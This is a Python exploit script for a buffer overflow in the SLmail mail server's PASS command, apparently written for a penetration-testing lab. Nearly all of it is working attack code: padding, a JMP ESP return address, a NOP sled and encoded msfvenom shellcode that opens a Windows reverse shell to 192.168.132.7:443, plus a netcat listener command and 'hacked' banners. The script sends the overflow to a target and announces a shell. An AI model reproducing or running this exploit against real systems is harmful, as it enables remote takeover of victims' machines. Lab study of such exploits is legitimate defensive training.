#!/usr/bin/python
# coding=utf-8

import time, struct, sys
import socket as so

anonymous = (
"\n"
"  █████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█\n"
"  ██▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█\n"
"  █▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"
"  ██▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"
"  █▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█\n"
"  ██████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█\n"
"  █▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"
"  ██▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"
"  █▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"
"  ███▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"
"  ███▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██\n"
"  ███▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██\n"
"  ██▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██\n"
"  ██▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██\n"
"  ███▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██\n"
"  ███▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███\n"
"  ████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███\n"
"  █████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████\n"
"  █████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████\n"
"  ██████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████\n"
"  ███████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████\n"
"  ████████▓▓▓█▓▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬▓███████\n"
"  █████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████\n"
"  █████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬█████████\n"
"  █████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████\n")

hacked = (        
"    | |              | |          | |\n"
"    | |__   __ _  ___| | _____  __| |\n"
"    | '_ \ / _` |/ __| |/ / _ \/ _` |\n"
"    | | | | (_| | (__|   <  __/ (_| |\n"
"    |_| |_|\__,_|\___|_|\_\___|\__,_|\n\n")

achars = 'A'*2606

#JMP ESP address is 5F4A358F
jmpesp = '\x8f\x35\x4a\x5f'

#NOP Sled
nops = '\x90'*16

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.132.7 LPORT=443 -f py -b '\x00\x0a\x0d\' -e x86/shikata_ga_nai - THIS MUST BE REPLACED WITH YOUR MSFVENOM OUTPUT

buf =  b""
buf += b"\xdd\xc0\xbf\xf8\xd6\xb8\xf9\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x52\x83\xe8\xfc\x31\x78\x13\x03\x80\xc5\x5a"
buf += b"\x0c\x8c\x02\x18\xef\x6c\xd3\x7d\x79\x89\xe2\xbd\x1d"
buf += b"\xda\x55\x0e\x55\x8e\x59\xe5\x3b\x3a\xe9\x8b\x93\x4d"
buf += b"\x5a\x21\xc2\x60\x5b\x1a\x36\xe3\xdf\x61\x6b\xc3\xde"
buf += b"\xa9\x7e\x02\x26\xd7\x73\x56\xff\x93\x26\x46\x74\xe9"
buf += b"\xfa\xed\xc6\xff\x7a\x12\x9e\xfe\xab\x85\x94\x58\x6c"
buf += b"\x24\x78\xd1\x25\x3e\x9d\xdc\xfc\xb5\x55\xaa\xfe\x1f"
buf += b"\xa4\x53\xac\x5e\x08\xa6\xac\xa7\xaf\x59\xdb\xd1\xd3"
buf += b"\xe4\xdc\x26\xa9\x32\x68\xbc\x09\xb0\xca\x18\xab\x15"
buf += b"\x8c\xeb\xa7\xd2\xda\xb3\xab\xe5\x0f\xc8\xd0\x6e\xae"
buf += b"\x1e\x51\x34\x95\xba\x39\xee\xb4\x9b\xe7\x41\xc8\xfb"
buf += b"\x47\x3d\x6c\x70\x65\x2a\x1d\xdb\xe2\x9f\x2c\xe3\xf2"
buf += b"\xb7\x27\x90\xc0\x18\x9c\x3e\x69\xd0\x3a\xb9\x8e\xcb"
buf += b"\xfb\x55\x71\xf4\xfb\x7c\xb6\xa0\xab\x16\x1f\xc9\x27"
buf += b"\xe6\xa0\x1c\xe7\xb6\x0e\xcf\x48\x66\xef\xbf\x20\x6c"
buf += b"\xe0\xe0\x51\x8f\x2a\x89\xf8\x6a\xbd\x76\x54\x10\x38"
buf += b"\x1f\xa7\xd8\x43\x64\x2e\x3e\x29\x8a\x67\xe9\xc6\x33"
buf += b"\x22\x61\x76\xbb\xf8\x0c\xb8\x37\x0f\xf1\x77\xb0\x7a"
buf += b"\xe1\xe0\x30\x31\x5b\xa6\x4f\xef\xf3\x24\xdd\x74\x03"
buf += b"\x22\xfe\x22\x54\x63\x30\x3b\x30\x99\x6b\x95\x26\x60"
buf += b"\xed\xde\xe2\xbf\xce\xe1\xeb\x32\x6a\xc6\xfb\x8a\x73"
buf += b"\x42\xaf\x42\x22\x1c\x19\x25\x9c\xee\xf3\xff\x73\xb9"
buf += b"\x93\x86\xbf\x7a\xe5\x86\x95\x0c\x09\x36\x40\x49\x36"
buf += b"\xf7\x04\x5d\x4f\xe5\xb4\xa2\x9a\xad\xc5\xe8\x86\x84"
buf += b"\x4d\xb5\x53\x95\x13\x46\x8e\xda\x2d\xc5\x3a\xa3\xc9"
buf += b"\xd5\x4f\xa6\x96\x51\xbc\xda\x87\x37\xc2\x49\xa7\x1d"

overflow = achars + jmpesp + nops + buf

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0]
   print "Make sure to use netcat first. Example: nc -nlvp 443"
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER jesse' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + overflow + '\r\n')
   print "\n[+] Completed. Check netcat for shell."
   print ("\033[1;32;48m" + anonymous)
   print hacked
except:
   print "[+] Unable to connect to SLmail. Check your IP address and port"
   sys.exit()
